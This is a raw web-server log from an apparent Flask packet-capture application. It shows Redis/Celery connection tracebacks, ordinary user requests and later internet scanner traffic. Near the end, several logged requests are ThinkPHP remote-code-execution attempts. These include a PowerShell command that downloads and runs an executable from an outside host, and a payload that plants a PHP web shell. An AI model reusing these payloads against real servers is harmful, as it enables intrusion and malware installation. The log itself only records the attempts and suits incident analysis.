  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 749, in send_task
    amqp.send_task_message(P, name, message, **options)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 452, in _reraise_as_library_errors
    raise ConnectionError(str(exc)) from exc
kombu.exceptions.OperationalError: Error 113 connecting to 122.51.255.207:6379. No route to host.
113.57.237.25 - - [21/May/2021 13:36:29] "[35m[1mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 500 -
113.57.237.25 - - [21/May/2021 13:37:09] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
[2021-05-21 13:37:28,768] ERROR in app: Exception on /PackageCapture [GET]
Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 117, in reconnect_on_error
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3580, in subscribe
    ret_val = self.execute_command('SUBSCRIBE', *iterkeys(new_channels))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3468, in execute_command
    self.shard_hint
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 448, in _reraise_as_library_errors
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 748, in send_task
    self.backend.on_task_call(P, task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 343, in on_task_call
    self.result_consumer.consume_from(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 159, in consume_from
    return self.start(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 137, in start
    self._consume_from(initial_task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 120, in reconnect_on_error
    self._ensure(self._reconnect_pubsub, ())
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 357, in ensure
    **retry_policy)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/utils/functional.py", line 325, in retry_over_time
    return fun(*args, **kwargs)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 105, in _reconnect_pubsub
    metas = self.backend.client.mget(self.subscribed_to)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 1671, in mget
    return self.execute_command('MGET', *args, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 898, in execute_command
    conn = self.connection or pool.get_connection(command_name, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
    return cors_after_request(app.make_response(f(*args, **kwargs)))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
    raise value
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "server.py", line 873, in getPackage
    netpackage_capture.apply_async(kwargs={'username': username}, priority=priority)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/task.py", line 565, in apply_async
    **options
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 749, in send_task
    amqp.send_task_message(P, name, message, **options)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 452, in _reraise_as_library_errors
    raise ConnectionError(str(exc)) from exc
kombu.exceptions.OperationalError: Error 113 connecting to 122.51.255.207:6379. No route to host.
113.57.237.25 - - [21/May/2021 13:37:28] "[35m[1mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 500 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:44] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:49] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:49] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:51] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:52] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:38:52] "[37mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:39:51] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:46:00] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:46:00] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:46:03] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:46:09] "[37mOPTIONS /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:46:09] "[37mPOST /selectFeaturesGenerate HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:47:08] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:47:22] "[37mOPTIONS /logout HTTP/1.1[0m" 200 -
113.57.237.24 - - [21/May/2021 13:47:22] "[37mPOST /logout HTTP/1.1[0m" 200 -
64.62.197.92 - - [21/May/2021 14:17:26] "[33mGET / HTTP/1.1[0m" 404 -
45.148.10.50 - - [21/May/2021 17:37:19] "[33mHEAD / HTTP/1.0[0m" 404 -
113.57.237.25 - - [21/May/2021 19:12:02] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:02] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:03] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:05] "[37mOPTIONS /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:05] "[37mPOST /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:09] "[37mOPTIONS /consoleLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 19:12:09] "[37mPOST /consoleLog HTTP/1.1[0m" 200 -
45.148.10.50 - - [22/May/2021 01:00:40] "[33mHEAD / HTTP/1.0[0m" 404 -
74.120.14.40 - - [22/May/2021 01:16:34] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.40 - - [22/May/2021 01:16:36] "[33mGET / HTTP/1.1[0m" 404 -
45.148.10.50 - - [22/May/2021 01:22:11] "[33mHEAD / HTTP/1.0[0m" 404 -
45.148.10.50 - - [22/May/2021 02:01:38] "[33mHEAD / HTTP/1.0[0m" 404 -
162.142.125.56 - - [22/May/2021 02:22:39] "[33mGET / HTTP/1.1[0m" 404 -
162.142.125.56 - - [22/May/2021 02:22:40] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [22/May/2021 03:32:05] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [22/May/2021 03:32:05] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [22/May/2021 03:32:05] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
88.5.238.31 - - [22/May/2021 04:08:37] "[33mGET / HTTP/1.1[0m" 404 -
45.148.10.50 - - [22/May/2021 04:24:30] "[33mHEAD / HTTP/1.0[0m" 404 -
45.148.10.50 - - [22/May/2021 04:27:22] "[33mHEAD / HTTP/1.0[0m" 404 -
193.37.255.114 - - [22/May/2021 04:33:06] "[33mGET / HTTP/1.1[0m" 404 -
193.37.255.114 - - [22/May/2021 04:33:09] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
193.37.255.114 - - [22/May/2021 04:33:20] code 400, message Bad request syntax ('\x03\x07\x19¨`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
193.37.255.114 - - [22/May/2021 04:33:20] "[35m[1m¨`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            [0m" HTTPStatus.BAD_REQUEST -
34.76.80.167 - - [22/May/2021 04:33:56] "[33mGET / HTTP/1.1[0m" 404 -
89.248.165.5 - - [22/May/2021 05:32:22] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
89.248.165.5 - - [22/May/2021 05:32:22] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.148.10.50 - - [22/May/2021 07:51:20] "[33mHEAD / HTTP/1.0[0m" 404 -
185.167.96.236 - - [22/May/2021 08:16:33] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03¥\x00«É!ðJëzÖR7±\x9d\x8d[\x03ë\x15ü\x0f±IK£Ø{\x14`ÂÐ÷\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
185.167.96.236 - - [22/May/2021 08:16:33] "[35m[1m {  w¥ «É!ðJëzÖR7±[ëü±IK£Ø{`ÂÐ÷  À/À+ÀÀÀÀ	ÀÀ[0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [22/May/2021 08:21:20] "[33mGET http://passport.baidu.com/ HTTP/1.1[0m" 404 -
47.241.193.60 - - [22/May/2021 08:21:23] code 400, message Bad request syntax ('\x05\x01\x00')
47.241.193.60 - - [22/May/2021 08:21:23] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
47.241.193.60 - - [22/May/2021 08:22:44] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
47.241.193.60 - - [22/May/2021 08:22:44] "[35m[1m Pg)§ê [0m" HTTPStatus.BAD_REQUEST -
220.200.158.243 - - [22/May/2021 08:22:48] code 400, message Bad request syntax ('\x05\x03\x00\x01\x02')
220.200.158.243 - - [22/May/2021 08:22:48] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
185.153.199.107 - - [22/May/2021 09:41:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.153.199.107 - - [22/May/2021 09:41:58] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [22/May/2021 10:42:32] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [22/May/2021 10:42:32] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
185.153.199.107 - - [22/May/2021 10:49:37] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
185.153.199.107 - - [22/May/2021 10:49:37] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.118.53.210 - - [22/May/2021 11:25:29] "[33mGET / HTTP/1.1[0m" 404 -
120.241.72.15 - - [22/May/2021 12:11:16] "[33mGET /struts2-rest-showcase/orders.xhtml HTTP/1.1[0m" 404 -
120.241.72.15 - - [22/May/2021 12:11:16] "[33mGET /index.action HTTP/1.1[0m" 404 -
120.241.72.15 - - [22/May/2021 12:11:16] "[33mGET /index.do HTTP/1.1[0m" 404 -
60.174.93.24 - - [22/May/2021 14:16:25] "[33mGET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://UeR.ReiyKiQ.ir/download.exe','%SystemRoot%/Temp/fgavybrdjgrdwmo6195.exe');start%20%SystemRoot%/Temp/fgavybrdjgrdwmo6195.exe HTTP/1.1[0m" 404 -
60.174.93.24 - - [22/May/2021 14:16:25] "[33mGET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php HTTP/1.1[0m" 404 -
60.174.93.24 - - [22/May/2021 14:16:25] "[33mGET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://UeR.ReiyKiQ.ir/download.exe','%SystemRoot%/Temp/fgavybrdjgrdwmo6195.exe');start%20%SystemRoot%/Temp/fgavybrdjgrdwmo6195.exe HTTP/1.1[0m" 404 -
104.206.128.74 - - [22/May/2021 14:39:59] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [22/May/2021 15:28:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [22/May/2021 15:28:35] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [22/May/2021 16:04:08] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [22/May/2021 16:04:08] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [22/May/2021 17:52:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [22/May/2021 17:52:20] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [22/May/2021 19:56:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [22/May/2021 19:56:43] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [22/May/2021 20:01:56] code 400, message Bad request syntax ('{\x01\x00\x1615888888888À¨\x90Á\x13\x8a{')
161.189.192.94 - - [22/May/2021 20:01:56] "[35m[1m{ 15888888888À¨Á{[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [22/May/2021 20:08:08] code 400, message Bad HTTP/0.9 request type ('xx')
161.189.134.11 - - [22/May/2021 20:08:08] "[35m[1mxxSA52b -[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [22/May/2021 20:12:45] code 400, message Bad request syntax ('&&&&~\x04»8ÅaýT\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
161.189.134.11 - - [22/May/2021 20:12:45] "[35m[1m&&&&~»8ÅaýTP.VJÃ;00-0C-29-B1-35-79[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [22/May/2021 20:27:57] code 400, message Bad request syntax ('\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x01.\x05\x00\x00\x00\x00\x81I¨À\x00\x0c)\x83z»\x01\x00zÚf\x00\x8d\x16Ò~\x9dU\x05ñ\x1fi»©\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ÃÐ¢|¦v½ó\x1eOÑËÜ®Ëd')
161.189.134.11 - - [22/May/2021 20:27:57] "[35m[1m   TZ         .    I¨À )z» zÚf Ò~Uñi»©                ÃÐ¢|¦v½óOÑËÜ®Ëd[0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [22/May/2021 20:33:04] code 400, message Bad request syntax ('~\x00\x02\x00\x00\x01\x88\x88\x88\x88\x88\x03¥-~')
161.189.192.94 - - [22/May/2021 20:33:04] "[35m[1m~   ¥-~[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [22/May/2021 20:37:48] code 400, message Bad request syntax ('[\x00\x00\x00H\x00\x00\x00\x01\x10\x01\x00\x01\x04j\x00\x00\x01\x00\x00\x00\x00')
161.189.134.11 - - [22/May/2021 20:37:48] "[35m[1m[   H    j      [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [22/May/2021 20:41:48] code 400, message Bad HTTP/0.9 request type ('\x02¤Uÿ\x00\x00\x00')
161.189.192.94 - - [22/May/2021 20:41:48] "[35m[1m¤Uÿ   [0m" HTTPStatus.BAD_REQUEST -
161.189.192.94 - - [22/May/2021 20:45:10] code 400, message Bad request syntax ('~~\x01\x00\x124Vx\x124/\x00\x08\x02\x00\x03Y\x10\x11\x15Q\x11\x03kÊ')
161.189.192.94 - - [22/May/2021 20:45:10] "[35m[1m~~ 4Vx4/  YQkÊ[0m" HTTPStatus.BAD_REQUEST -
161.189.134.11 - - [22/May/2021 20:52:08] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
161.189.134.11 - - [22/May/2021 20:52:08] "[35m[1m333766643833656338616434363333643963363962386536653538383937393235613033653338636434[0m" HTTPStatus.BAD_REQUEST -
183.136.225.14 - - [22/May/2021 22:55:21] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [22/May/2021 22:55:21] "[33mGET / HTTP/1.1[0m" 404 -
183.136.225.14 - - [22/May/2021 22:55:21] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
